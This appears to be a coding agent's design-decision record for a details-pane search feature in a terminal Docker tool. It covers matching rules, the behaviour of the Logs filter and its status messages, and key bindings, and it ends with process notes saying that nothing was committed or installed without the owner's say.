**Decided:** the bar is drawn in the pane's last content row only while it is typed in or a query
is kept; the tab then lays out in one row fewer. In Logs it lives in the status row, before the
state (`filter: error  ● following · 12 of 5000 match`). `/` opens it on every tab: on Stats and
Findings, which are not text, it says `nothing to search on Stats` rather than doing nothing.

**Alternative:** a bar in the pane's border; or `/` ignored on Stats and Findings.

**Why:** the border holds the title and tabs and is already cut at 80 columns. A key that does
nothing on two tabs is a mode to remember; a bar that says why is not. **Cost:** at 80×24 the
pane shows six rows of text instead of seven while a search is open.

### Q3 — Matching: case-insensitive substring of the stripped text, literally

**Decided:** escape sequences are removed before matching, whether colour is drawn or not, so
`ERR\x1b[0mOR` matches `error` and `31m` matches nothing. Case is folded rune by rune
(`unicode.SimpleFold`), so a match's offsets are always offsets of the text itself, even where
a rune's other case has a different length. The query is taken as typed — no pattern syntax,
and spaces are kept (unlike the List filter, which trims), so ` error` can be told from
`terror`.

**Alternative:** regular expressions; matching the raw line; `strings.ToLower` on both sides.

**Why:** a pattern is a second language to get wrong in a one-row bar, and the brief excluded it.
The raw line matches the daemon's colour codes. Lowering both sides breaks the mapping from a
match back to the bytes to mark (`İ` lowers to two runes). The stripping is the desk's own walk
(`search.Strip`), the same one that marks, so the two cannot disagree on an offset.

### Q4 — A jump is a pending seek, settled in `render` after layout

**Decided:** keys never write `textView.off`. `Enter` sets a pending seek; `n` and `N` add to a
pending step (two presses before a frame count twice). `render` runs `layout(w)` first, then
chooses the current match, applies the step, and only then moves the offset — to the wrapped row
that holds the match's first byte, found from a row → (line, offset) map that `layout` builds. A
match already on screen does not move the view; one off screen is placed a third of the way
down, so the lines above it — its parents, in Inspect — are visible. While typing, the view does
not move; the current match is the first at or below the top row, so `1 of 9` means "the next
one from here", and Enter goes to it. `n` and `N` step from the current match, not from wherever
the view was scrolled since.

**Alternative:** move the view as each character is typed (incremental search); compute the row
in the key handler.

**Why:** the width, and so which row a match is on, is known only inside `render`; a handler that
guessed would be wrong after a resize or a wrap toggle. Moving while typing makes the text jump
under every keystroke, and the brief asked for the jump on Enter.

### Q5 — Memoised by (content version, query); the filter grows by what arrived

**Decided:** `textView` gains a version, bumped only when `set` is given lines that differ.
`set` now ignores identical lines — Info, Processes and Changes call it on every frame — which also
stops them being re-wrapped every frame. Matches are kept per view for (version, query); Inspect
key paths for the inspect version. The Logs filter keeps the absolute indices of matching lines
for (ring, query, scanned-to): each frame tests only the lines that arrived since, drops indices
the ring has discarded, and copies out of the ring only the matching lines it is about to draw.
A new query, or a new ring (another container), tests the held lines once.

**Cost:** the indices take at most 40 kB. Under a flood the work per frame is the lines that
arrived, at most the ring's 5000 — D8's "a frame does not depend on how much arrived" holds for
an open filter only up to that bound. Testing 5000 lines of 200 bytes takes about 3.6 ms
(`BenchmarkFind5000Lines`), once per keystroke.

### Q6 — The mark: bold and underlined; reversed for the current one; brackets with no colour

**Decided:** a match is bold and underlined, in the accent colour where the theme has one; the
current match is reversed too. The marks are written per wrapped row, so a match broken by the
wrap is marked on both rows, and the line's own colour is restored after each mark (a colour
change inside a match re-asserts the mark). With no colour at all — `NO_COLOR`, or a terminal
without it — the renderer draws no attribute (T5), so matches are bracketed: `›…‹`, the current
one `»…«`.

**Why:** bold and underline survive a theme without colours (`mono`); the accent is checked for
contrast against every theme's background (`TestThemesAreLegible` now checks the match colour
too) and, reversed, becomes a background of the same contrast. **Cost:** brackets lengthen a row
by two cells per match; a row they push past the pane is cut at its end, as any long row is.

### Q7 — The Logs filter says what it searched, and only that

**Decided:** the count is against the lines held: `● following · 12 of 5000 match`, and when
nothing matches, `no match in the 5000 lines held` — never a bare "no match". The existing
`N older lines scrolled out` is kept beside it. Nothing is fetched to search further back.

**Alternative:** reopen the stream with a larger tail, or ask the daemon for the whole log.

**Why:** a filter that said "no match" while the daemon held the line would be believed. Reading
further back is a request the brief excludes, and would still not be exhaustive (the daemon's
own log rotation). The README and the help say that older output is not searched.

### Q8 — Following and scrolling back inside the filtered set

**Decided:** the position is still an absolute ring index (`logEnd`), so the rest of the Logs
code is unchanged; with a filter, scrolling moves by matching lines, the bottom of a held view is
always a matching line, and going past the newest match follows again. The status row counts
`newer matches`. Changing the query while scrolled back keeps the place; if no match is left
above it, the oldest match is shown — as when lines scroll out of the ring.

### Q9 — `n` and `N`: shadowing "new" only while a search is open

**Decided:** while the current tab has a query, `n` is the next match and `N` the previous; the
hints then drop `n new`. When the query is cleared (`Esc`), `n` is "new volume" / "new network"
again. While the bar is typed in, `n` is a letter.

**Alternative:** other keys for next/previous (`Ctrl+N`, `↓`, `Enter` again).

**Why:** `n`/`N` are what `less`, `vim` and `man` use; `N` meant nothing in the desk. The action
shadowed opens a form and sends nothing, so a slip — the search was cleared and `n` opens "new
volume" — costs one `Esc`. B7 said the Details pane's own keys do not collide with actions; this
is the one exception, and it exists only while a search is open.

### Q10 — While the bar is typed in, every key is text

**Decided:** the bar is routed in `onKey` directly after the List filter — before `q`, `?`, `S`,
`T`, `r`, the digits, `[` `]`, `Tab`, the pane and every action. Only `Ctrl+C` (and a terminal
too small to draw) go first, as for every input. A pending confirmation being prepared is dropped
by the first key, as B26 already does.

### Q11 — Queries are per tab, cleared with the object; the bar stays open

**Decided:** each tab keeps its own query (in its view, or in the search state for Logs, Stats
and Findings). A new highlighted object clears all of them. If the bar is being typed in at that
moment — a refresh can move the highlight — it stays open and empty, so the next key typed is
still text and cannot land on an action of the new object.

**Esc** clears the query and closes the bar, whether typing or not; with no query, `Esc` returns
to the List. **Cost:** this differs from the List filter, whose Esc restores the previous filter;
the brief asked for clearing.

### Q12 — The key path: indentation and the last key at each depth

**Decided:** `internal/keypath` derives the path of every line of `json.Indent` output from its
indentation alone: its parent is the last line opened one level up; its segment is its leading
`"key":`, or `[n]` in an array. A key that is not a plain name (`com.docker.compose.project`,
`80/tcp`) is written `Labels["com.docker.compose.project"]`, so the dots stay unambiguous; a
closing line has the path of what it closes. It is shown on Inspect only, and derived once per
document. **Found:** the daemon reports a container's health under `State`, so the bar reads
`at State.Health.Status`; `Config.Healthcheck` holds the test. Tests use the real place.

### Q13 — The fake's log lines vary

**Decided:** a container without a fixed `LogLine` now writes a slow request every 13th line and
a failed one (`level=error … status=500`) every 31st, so `make sandbox` has something to filter.
`docs/screens/17-under-flood.txt` was captured before and still shows uniform lines; it was not
recaptured.

### Q14 — Left out

Search in Stats and Findings (not text — Findings has its own `/` in the Packages view); patterns;
reading older log output; remembering a query across objects; search in the Events and Jobs
panes. None was asked for, and each would need its own answer to "what was searched".

## Process

### B12 — No commits were made

The work was done on the branch that was checked out, and nothing was committed: committing
was not asked for. Everything is in the working tree for review. (Rounds four and five likewise.)

### B13 — The binary was not installed into `PATH`

`make build` leaves `bin/docker-desk`; `make install` puts it in `~/go/bin`, which is already
on `PATH`. Writing outside the repository was left as a one-command decision for the owner of
the machine. (`go install` into a scratch directory was verified to work.)

### B24 — The OpenSpec change is complete but not archived

All tasks are done and the change validates. Archiving — which folds the capability specs into
`openspec/specs/` — is an acceptance step and was left for after review (`/opsx:archive`). The same holds for
round five's `disk-space` change, round seven's `image-packages` change, round eight's
`image-changes` change, and round ten's `details-search` change.
